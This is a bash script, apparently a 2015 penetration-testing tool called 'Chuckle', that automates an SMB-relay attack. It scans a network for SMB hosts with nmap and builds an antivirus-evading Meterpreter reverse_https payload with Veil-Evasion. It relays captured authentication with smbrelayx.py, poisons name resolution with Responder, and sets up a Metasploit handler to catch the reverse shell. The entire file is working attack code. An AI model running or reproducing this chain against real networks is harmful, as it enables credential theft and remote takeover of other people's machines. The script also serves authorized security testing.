#!/bin/bash
#Requires Nmap, Responder, SMBRelayX, Latest version of Veil, metasploit.
trap 'kill $(jobs -p)'  EXIT
clear
echo "_________ .__                   __   .__          "
echo "\_   ___ \|  |__  __ __   ____ |  | _|  |   ____  "
echo "/    \  \/|  |  \|  |  \_/ ___\|  |/ /  | _/ __ \ "
echo "\     \___|   Y  \  |  /\  \___|    <|  |_\  ___/ "
echo " \______  /___|  /____/  \___  >__|_ \____/\___  >"
echo "        \/     \/            \/     \/         \/"
echo "                                  CSB 2015"
echo " Automated SMB-Relay Script"
echo -e '\n'
echo "Please enter IP or Network to scan for SMB:"
read network;
nmap -n -Pn -sS --script smb-security-mode.nse -p445 -oA chuckle $network  >>chuckle.log &
echo "Scanning for SMB hosts..."
wait
grep open chuckle.gnmap |cut -d " " -f 2 >./chuckle.hosts
#cat chuckle.hosts |xargs nbtscan -f > chuckle.nbt
if [[ -s chuckle.hosts ]] ; then
	echo "Select SMB Relay target:"
	hosts=$(<chuckle.hosts);
	select target in $hosts;
	do
		echo "Authentication attempts will be relayed to $target";
		break;
	done
else 
	echo "No SMB hosts found."
	exit;
fi;
localip=$(hostname -I)
echo "Select local IP for reverse shell:"
select lhost in $localip;
do 
	echo "Meterpreter shell will connect back to $lhost";
	break;
done
echo "Please enter local port for reverse connection:"
read port;
echo "Meterpreter shell will connect back to $lhost on port $port";
echo "Generating Payload..."
payload=$(veil-evasion -p go/meterpreter/rev_https -c LHOST=$lhost LPORT=$port -o $target 2>/dev/null|grep exe |cut -d " " -f6|sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g");
echo "Payload created: $payload"
echo "Starting SMBRelayX..."
smbrelayx.py -h $target -e $payload  >> ./chuckle.log  &
echo "Stating Responder..."
responder -i $lhost -wrfF >>chuckle.log &
echo "Setting up listener..."
echo "use exploit/multi/handler" > chuckle.rc
echo "set payload windows/meterpreter/reverse_https" >> chuckle.rc
echo "set LHOST $lhost" >> chuckle.rc
echo "set LPORT $port" >> chuckle.rc
echo "set autorunscript post/windows/manage/migrate" >> chuckle.rc
echo "exploit -j" >> chuckle.rc
msfconsole -q -r ./chuckle.rc

